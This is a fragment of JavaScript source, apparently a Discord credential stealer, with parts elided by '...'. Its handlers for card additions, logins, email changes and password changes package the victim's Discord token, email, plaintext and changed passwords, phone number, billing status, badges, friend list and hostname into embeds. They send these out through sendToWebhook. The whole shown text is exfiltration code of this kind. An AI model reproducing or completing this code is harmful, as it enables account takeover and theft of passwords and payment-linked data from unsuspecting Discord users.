    ...
    async creditCardAdded(number, cvc, month, year) {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [
                    {
                        name: "<:crow:1170716733074587649> Token",
                        value: `\`${token}\``,
                        inline: false
                    }, 

                    {
                        name: "<:crow:1170716199143866508> Nitro Type",
                        value: `${getNitro(userInfo.premium_type)}`,
                        inline: true
                    }, {
                        name: "<:crow:1170711397437550592> Billing",
                        value: `${billing}`,
                        inline: true
                    }, {
                        name: "<:crow:1170710821144367135> Badges",
                        value: `${getBadges(userInfo.flags)}`,
                        inline: true
                    },
                    {
                        name: "<:crow:1170716199143866508> Phone",
                        value: `\`${userInfo.phone ?? "None"}\``,
                        inline: false
                    },
                    {
                        name: "<:crow:1170711397437550592> IP",
                        value: `\`${os.hostname}\``,
                        inline: true
                    },
                ],
            }), createEmbed({
                description: `<:crow:1170716733074587649> **Total Friends (${friends['length']})**\n\n${friends.frien}`,
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                author: {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [
                    ...
                    {
                        name: "<:crow:1170711397437550592> E-Mail",
                        value: `\`${email}\``,
                        inline: true
                    },
                    {
                        name: "<:crow:1170716199143866508> Password",
                        value: `\`${password}\``,
                        inline: true
                    },
                ],
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [
                    ...
                    {
                        name: "<:crow:1170711397437550592> Badges",
                        value: `${getBadges(userInfo.flags)}`,
                        inline: true
                    },
                    {
                        name: "<:crow:1170710821144367135> New email",
                        value: `\`${newEmail}\``,
                        inline: true
                    },
                    {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [
                    ...
                    {
                        name: "<:crow:1170716199143866508> E-Mail",
                        value: `\`${email}\``,
                        inline: true
                    },
                    {
                        name: "<:crow:1170710821144367135> Old password",
                        value: `\`${oldPassword}\``,
                        inline: false
                    },
                    {
                        name: "<:crow:1170711397437550592> New password",
                        value: `\`${newPassword}\``,
                        inline: false
                    },
                ],
            ...
            if (token == undefined) {
                sendToWebhook({
                    ...
                    embeds: [createEmbed({
                        ...
                        fields: [{
                            name: "<:crow:1170716199143866508> Hostname",
                            value: `\`\`\`${os.hostname}\`\`\``,
                            inline: true
                        }, {
                            name: "<:crow:1170711397437550592> Client version",
                            value: `\`\`\`${getDiscordClient()}\`\`\``,
                            inline: true
                        }, {
                            name: "<:crow:1170710821144367135> Connection data",
                ...
                sendToWebhook({
                    ...
                    embeds: [createEmbed({
                        ...
                        fields: [
                            ...
                            {
                                name: "<:crow:1170711397437550592> Phone",
                                value: `\`${userInfo.phone ?? "None"}\``,
                                inline: false
                            },
                        ],
